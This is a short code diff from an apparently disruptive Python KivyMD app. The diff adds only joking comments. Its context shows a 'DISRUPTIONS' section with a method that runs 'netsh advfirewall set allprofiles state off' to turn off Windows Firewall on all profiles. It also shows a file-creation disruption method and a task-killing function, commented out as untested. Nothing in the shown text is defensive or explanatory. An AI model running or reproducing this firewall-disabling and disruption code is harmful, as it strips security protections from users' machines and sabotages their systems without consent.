@@ -201,6 +201,7 @@ class Main(MDApp):
 
     ###############################DISRUPTIONS############################################
     #Disable Firewall Disruption
+    #Juls Simp
     def Firewall(self):
         while True:
             command = "netsh advfirewall set allprofiles state off"
@@ -210,6 +211,7 @@ class Main(MDApp):
             print(f"Output: {output}")
             break
 
+    #Zees Simp
     # File Creation Disruption
     def FileCreate(self):
         while True:
@@ -227,6 +229,7 @@ class Main(MDApp):
             break
 
 """
+
 UNTESTED SO I COMMENTED DISRUPRTIONS OUT FOR NOW OMEGALUL
 def KillTask():
     while True:
